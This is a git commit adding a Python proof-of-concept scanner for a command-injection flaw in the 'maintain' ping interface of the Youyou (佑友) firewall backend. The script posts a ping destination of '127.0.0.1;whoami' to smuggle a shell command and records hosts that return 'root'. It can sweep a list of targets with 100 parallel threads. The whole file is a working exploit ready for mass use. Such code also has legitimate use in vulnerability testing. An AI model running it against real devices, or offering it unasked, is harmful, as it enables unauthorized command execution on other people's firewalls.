92c46f149ef6825b5c0cfd1f5b8809f825193e98
huaiying666 <2929384884@qq.com>
2024-07-01 21:51:53 +0800

    Create 佑友防火墙后台接口maintain存在命令执行漏洞.py

---
+++ 佑友防火墙后台接口maintain存在命令执行漏洞/佑友防火墙后台接口maintain存在命令执行漏洞.py
@@ -0,0 +1,57 @@
+import argparse  # 用于解析命令行参数
+import sys  # 提供对解释器使用或影响解释器的函数和变量的访问
+import requests  # 用于发送HTTP请求
+import re  # 正则表达式模块，用于字符串匹配和操作
+import time  # 提供时间相关的功能
+from multiprocessing.dummy import Pool  # 使用线程池来并行处理任务
+requests.packages.urllib3.disable_warnings()  # 禁用requests库中的警告
+def main():
+    parser = argparse.ArgumentParser(description="J_C")
+    parser.add_argument('-u', '--url', dest='url', type=str, help="input link")
+    parser.add_argument('-f', '--file', dest='file', type=str, help="file path")
+    args = parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif not args.url and args.file:
+        url_list = []  
+        with open(args.file, 'r', encoding='utf-8') as fp:
+            for i in fp.readlines():
+                url_list.append(i.strip().replace('\n',''))
+        mp = Pool(100)
+        mp.map(poc, url_list)
+        mp.close()  
+        mp.join()  
+    else:
+        print(f"Usage:\n\t python3 {sys.argv[0]} -h ")
+def poc(target):
+    payload_url = '/index.php?c=maintain&a=ping'
+    url = target + payload_url
+    header = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+            'Accept-Encoding': 'gzip, deflate, br, zstd',
+            'Connection': 'keep-alive',
+            'Cookie': 'your-cookie',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'frame',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1'
+    }
+    data = '''interface=&destip=127.0.0.1;whoami'''
+    try:
+        res1 = requests.get(url=target, headers=header, timeout=10)
+        if res1.status_code == 200:
+            res2 = requests.post(url=url, headers=header,data=data,timeout=10)
+            if "root" in res2.text:
+                print(f'[+] 该URL存在漏洞,地址为{target}')
+                with open('result.txt', 'a', encoding='utf-8') as f:
+                    f.write(target + "\n")
+            else:
+                print(f'[-] 该URL{target}不存在漏洞')
+    except Exception as e:
+        print(f'[*] 该URL{target}存在访问问题，请手工测试')
+
+if __name__ == '__main__':
+    main()
